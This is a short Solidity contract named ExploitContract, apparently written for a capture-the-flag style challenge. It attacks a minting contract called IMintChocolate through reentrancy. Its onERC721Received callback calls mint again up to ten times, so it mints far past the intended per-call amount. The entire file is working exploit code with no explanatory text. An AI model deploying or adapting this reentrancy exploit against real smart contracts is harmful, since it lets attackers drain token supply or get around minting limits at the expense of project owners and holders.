pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMintChocolate {
    function mint(uint256 amount) external;
}

contract ExploitContract is IERC721Receiver {
    IMintChocolate mincho;
    uint256 public counter = 0;

    constructor(address _mincho) {
        mincho = IMintChocolate(_mincho);
    }

    function run() public {
        mincho.mint(10);
    }

    function onERC721Received(address sender, address from, uint256 _tokenId, bytes calldata data) external override returns (bytes4 retval) {
        if(counter < 10) {
            counter++;
            mincho.mint(10);
        }
        return this.onERC721Received.selector;
    }
}